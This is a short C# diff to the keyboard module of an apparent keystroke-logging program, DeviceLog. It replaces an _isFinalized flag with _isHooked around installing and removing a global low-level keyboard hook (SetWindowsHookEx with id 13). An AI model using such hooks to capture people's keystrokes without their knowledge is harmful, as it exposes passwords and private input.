@@ -133,7 +133,7 @@ namespace DeviceLog.Classes.Modules.Keyboard
         /// <summary>
         /// A boolean to indicate whether or not the low-level hook has been removed
         /// </summary>
-        private bool _isFinalized;
+        private bool _isHooked;
         /// <summary>
         /// The private callback degelate that will be called when the hook is placed
         /// </summary>
@@ -168,7 +168,7 @@ namespace DeviceLog.Classes.Modules.Keyboard
             _logSpecialKeys = logSpecial;
             _logControlKeys = logControl;
 
-            _isFinalized = true;
+            _isHooked = false;
         }
 
         /// <summary>
@@ -176,11 +176,11 @@ namespace DeviceLog.Classes.Modules.Keyboard
         /// </summary>
         internal void Hook()
         {
-            if (!_isFinalized) return;
+            if (_isHooked) return;
             _theHookCb = KeybHookProc;
             _hookId = SetWindowsHookEx(13, _theHookCb, 0, 0);
 
-            _isFinalized = false;
+            _isHooked = true;
         }
 
         /// <summary>
@@ -204,9 +204,9 @@ namespace DeviceLog.Classes.Modules.Keyboard
         /// </summary>
         public void Dispose()
         {
-            if (_isFinalized) return;
+            if (!_isHooked) return;
             UnhookWindowsHookEx(_hookId);
-            _isFinalized = true;
+            _isHooked = false;
         }
 
         /// <summary>
